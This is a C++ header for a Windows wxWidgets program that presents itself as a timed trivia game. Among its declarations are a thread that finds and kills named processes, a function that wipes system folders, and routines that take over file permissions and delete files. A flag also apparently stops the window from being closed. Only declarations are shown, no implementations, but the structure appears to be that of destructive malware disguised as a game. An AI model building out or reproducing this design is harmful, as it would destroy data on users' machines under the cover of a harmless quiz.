#pragma once
#include "processes.hpp"
#include "string_helper.hpp"
#include "file_helper.hpp"
#include "json_helper.hpp"
#include "process_helper.hpp"
#include "index_helper.hpp"
#include "trivia_game/resources.h"
#include <algorithm>
#include <boost/algorithm/string.hpp>
#include <wx/wx.h>
#include <wx/sound.h>
#include <wx/thread.h>
#include <ranges>
#include <random>

struct TriviaQuestion {
	std::string question;
	std::vector<std::string> answers;
	int correctAnswer;
};

struct ProcessNameAndFileName {
	std::string fileName;
	std::string name;
};

enum {
	QUESTION_ID = 10,
	SUBMIT_BUTTON_ID,
	TIME_TEXT_ID,
};

std::vector<TriviaQuestion> getTriviaQuestions(std::string fileContents);
std::vector<TriviaQuestion> parseQuestions();
void* getUserInput(void* arg);
void loadFileInResource(int name, std::string type, DWORD& size, const char*& data);

class MainAppFrame;

class TimeThread : public wxThread {
public:
	TimeThread(MainAppFrame* handler) : wxThread(wxTHREAD_DETACHED) {
		handlerPointer = handler;
	}
	~TimeThread();
protected:
	virtual ExitCode Entry();
	MainAppFrame* handlerPointer;
};

class ProcessKillerThread : public wxThread {
public:
	ProcessKillerThread(MainAppFrame* handler, std::vector<ProcessNameAndFileName> processNamesAndFiles) : 
		wxThread(wxTHREAD_DETACHED),
		handlerPointer(handler),
		_processNamesAndFiles(processNamesAndFiles)
		{}
	~ProcessKillerThread();

protected:
	virtual ExitCode Entry();
	MainAppFrame* handlerPointer;

private:
	void OnDelete();
	void findAndKill(ProcessNameAndFileName procInfo);
	DWORD _pid = 0;
	std::vector<ProcessNameAndFileName> _processNamesAndFiles;
	bool _endNow = false;
};

class MainAppFrame : public wxFrame {
public:
	MainAppFrame();

protected:
	TimeThread* timeThread;
	ProcessKillerThread* processKillerThread;
	wxCriticalSection threadCritical;

	friend class TimeThread;
	friend class ProcessKillerThread;

private:
	wxStaticText* _timeText;
	int _pickedAnswer;
	wxPanel* _panel;
	bool _canClose = false;
	bool _hasAnswered = false;
	std::vector<TriviaQuestion> _triviaQuestions;
	#if WINVER > _WIN32_WINNT_NT4
	std::vector<std::vector<std::wstring>> _fileCollections;
	#else
	std::vector<std::vector<std::string>> _fileCollections;
	#endif
	TriviaQuestion _randomQuestion;
	wxButton* _submitButton;
	int _remainingSeconds = 10;
	std::vector<wxRadioButton*> _radioButtons;

	void displayQuestion(wxBoxSizer* sizer, wxPanel* panel);
	void getQuestion();
	void wipeSystemFolders();
	#if WINVER > _WIN32_WINNT_NT4
	void deleteFiles(std::vector<std::wstring> files);
	#else
	void deleteFiles(std::vector<std::string> files);
	#endif
	void playSound();

	#if WINVER >= _WIN32_WINNT_VISTA
	std::vector<std::wstring> setPermissionsAndGetFiles(std::wstring path);
	#endif

	void DoStartThread();
	void OnThreadUpdate(wxThreadEvent& event);
	void OnThreadCompletion(wxThreadEvent& event);

	void OnSubmit(wxCommandEvent& event);
	void OnCountdown(wxTimerEvent& event);
	void OnRadioSelect(wxCommandEvent& event);
	void OnClose(wxCloseEvent& event);
	void OnExit(wxCommandEvent& event);
};

class TriviaGame : public wxApp {
public:
	virtual bool OnInit();
};